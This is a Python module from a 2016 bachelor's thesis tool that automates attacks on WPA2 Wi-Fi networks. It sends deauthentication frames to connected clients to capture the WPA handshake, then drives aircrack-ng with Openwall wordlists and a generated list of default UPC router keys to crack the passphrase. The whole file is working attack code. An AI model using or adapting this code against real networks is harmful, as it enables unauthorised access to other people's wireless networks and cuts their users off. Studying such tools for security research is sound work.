#!/usr/bin/env python3
"""
WPA2 cracking

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016

#Implementation notes
- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
- Aircrack-ng does not flush when stdout is redirected to file and -q is set.
- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
  to terminate.'
  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
  writing and reading is performed. There's only one writer and one reader per file.
- Subprocesses' feedback result is available as an update of process' state, flags and stats. State describes current
  position in a lifecycle of the process. Flags can be set or cleared based on events during life of the process.
  Flags can be later cleared or set by other parts of the script - after the flag was recognised and appropriate
  reaction was performed.

"""
import logging
import os
import pipes
import re
import tempfile
import time
from enum import Enum, unique
from typing import List, TextIO

import pkg_resources

from .model import WirelessAccessPoint, WirelessInterface
from .updatableProcess import UpdatableProcess
from .common import WirelessCapturer, deauthenticate, WifimitmError

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class Wpa2Error(WifimitmError):
    pass


class PassphraseNotInDictionaryError(Wpa2Error):
    pass


class PassphraseNotInAnyDictionaryError(Wpa2Error):
    pass


class Wpa2Cracker(UpdatableProcess):
    """
    "WPA/WPA2 supports many types of authentication beyond pre-shared keys. aircrack-ng can ONLY crack pre-shared keys.
    So make sure airodump-ng shows the network as having the authentication type of PSK, otherwise, don't bother trying
    to crack it.
    There is another important difference between cracking WPA/WPA2 and WEP. This is the approach used to crack
    the WPA/WPA2 pre-shared key. Unlike WEP, where statistical methods can be used to speed up the cracking process,
    only plain brute force techniques can be used against WPA/WPA2. That is, because the key is not static,
    so collecting IVs like when cracking WEP encryption, does not speed up the attack. The only thing that does give
    the information to start an attack is the handshake between client and AP."
    `cracking_wpa [Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=cracking_wpa>`_

    Although cracking WPA/WPA2 is based on brute force, used dictionary can be personalized by available AP details to
    increase the chance of finding the key.
    """

    @unique
    class State(Enum):
        """
        Wpa2Cracker process states.
        """
        CRACKING = 0
        """Cracking or waiting for more IVs."""
        STARTED = 2
        """Process just started."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, ap, dictionary):
        if not ap.wpa_handshake_cap_path:
            raise ValueError

        self.state = self.State.STARTED

        self.ap = ap
        self.dictionary = dictionary
        logger.debug("dictionary '{}'".format(str(self.dictionary)))

        cmd = ['aircrack-ng',
               '-a', '2',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-w', '-',  # dictionary is provided to stdin
               '-l', 'psk.ascii',  # Write the key into a file.
               self.ap.wpa_handshake_cap_path]
        # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
        super().__init__(cmd, stdin=self.dictionary)  # start process

    def __str__(self):
        return '<{!s} state={!s}>'.format(
            type(self).__name__, self.state)

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
        in the moment of termination of aircrack-ng.
        :raises PassphraseNotInDictionaryError: If passphrase was not found in provided dictionary.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:
                if 'Failed. Next try with' in line:
                    if self.state != self.State.TERMINATED:
                        self.state = self.State.CRACKING
                if 'KEY FOUND!' in line:
                    if self.state != self.State.TERMINATED:
                        self.state = self.State.CRACKING
                    self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.ascii'))
                    logger.debug('Wpa2Cracker found key!')
                if 'Passphrase not in dictionary' in line:
                    logger.debug('Passphrase not in dictionary.')
                    raise PassphraseNotInDictionaryError()

        # check stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED


def get_personalized_dictionaries(target: WirelessAccessPoint) -> List[TextIO]:
    """
    Create and return dictionary personalized by available AP details.
    :type target: WirelessAccessPoint
    :param target: targeted AP

    :rtype: List[TextIO]
    :return: list of opened personalized dictionaries
    """
    dictionaries = []
    if re.match(r'^UPC\d{7}$', target.essid):
        t = pipes.Template()
        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')
        t.append('grep "  -> WPA2 phrase for "', '--')
        t.append('sed "s/^  -> WPA2 phrase for \S* = \'\(.*\)\'$/\\1/"', '--')
        d = t.open('dictionary-pipeline', 'r')
        dictionaries.append(d)

    return dictionaries


class Wpa2Attacker(object):
    """
    Main class providing attack on WPA2 secured network.
    """

    def __init__(self, ap, monitoring_interface: WirelessInterface):
        """
        :type monitoring_interface: WirelessInterface
        :param monitoring_interface: wireless interface for attack
        """
        self.ap = ap
        self.monitoring_interface = monitoring_interface  # type: WirelessInterface

    def start(self, force=False):
        """
        Start attack on WPA2 secured network.
        If targeted network have already been cracked and `force` is False, attack is skipped.
        :param force: attack even if network have already been cracked
        :raises PassphraseNotInAnyDictionaryError: If passphrase was not in any available dictionary.
        """
        if not force and self.ap.is_cracked():
            #  AP already cracked
            logger.info('Known ' + str(self.ap))
            return

        if not self.ap.wpa_handshake_cap_path:
            with WirelessCapturer(interface=self.monitoring_interface,
                                  ap=self.ap) as capturer:
                while not self.ap.wpa_handshake_cap_path:
                    capturer.update()
                    while not capturer.flags['detected_wpa_handshake']:
                        time.sleep(2)
                        capturer.update()
                        result = capturer.get_capture_result()
                        if len(result):  # if AP was detected by capturer
                            tmp_ap = capturer.get_capture_result()[0]
                            if len(tmp_ap.associated_stations) == 0:
                                logger.info('Network is empty.')
                            # deauthenticate stations to acquire WPA handshake
                            for st in tmp_ap.associated_stations:
                                deauthenticate(self.monitoring_interface, st)
                                time.sleep(2)
                                capturer.update()
                                if capturer.flags['detected_wpa_handshake']:
                                    break
                        else:
                            logger.info('Network not detected by capturer yet.')
                    self.ap.save_wpa_handshake_cap(capturer.wpa_handshake_cap_path)
                    logger.info('WPA handshake detected.')

        # prepare dictionaries
        dictionaries = []
        dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
        # NOTE: Dictionary 'openwall_all.lst' has been compiled by Solar Designer
        # of Openwall Project. http://www.openwall.com/wordlists/ License is attached at 'resources/LICENSE'.
        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/test_dictionary.lst'))
        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/openwall_password.lst'))

        for idx, dictionary in enumerate(dictionaries):
            try:
                with Wpa2Cracker(ap=self.ap, dictionary=dictionary)as cracker:
                    while not self.ap.is_cracked():
                        cracker.update()
                        logger.debug(cracker)
                        time.sleep(5)
            except PassphraseNotInDictionaryError:
                logger.info('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
            finally:
                dictionary.close()

            if self.ap.is_cracked():
                logger.info('Cracked ' + str(self.ap))
                break
        else:
            # Passphrase was not in any dictionary, otherwise the above loop would break.
            logger.error('Passphrase not in any dictionary.')
            raise PassphraseNotInAnyDictionaryError()

        # AP is now cracked, close the dictionaries
        for dictionary in dictionaries:
            dictionary.close()


def verify_psk(ap: WirelessAccessPoint, psk: str):
    with tempfile.NamedTemporaryFile(mode='w', prefix='dictionary') as dictionary_w:
        dictionary_w.write(psk)
        dictionary_w.flush()

        with open(dictionary_w.name, 'r') as dictionary_r:
            with Wpa2Cracker(ap=ap, dictionary=dictionary_r) as cracker:

                try:
                    while not ap.is_cracked():
                        cracker.update()
                        logger.debug(cracker)
                        time.sleep(1)
                except PassphraseNotInDictionaryError:
                    result = False
                else:
                    result = True
                    logger.info('Verified ' + str(ap))
    return result
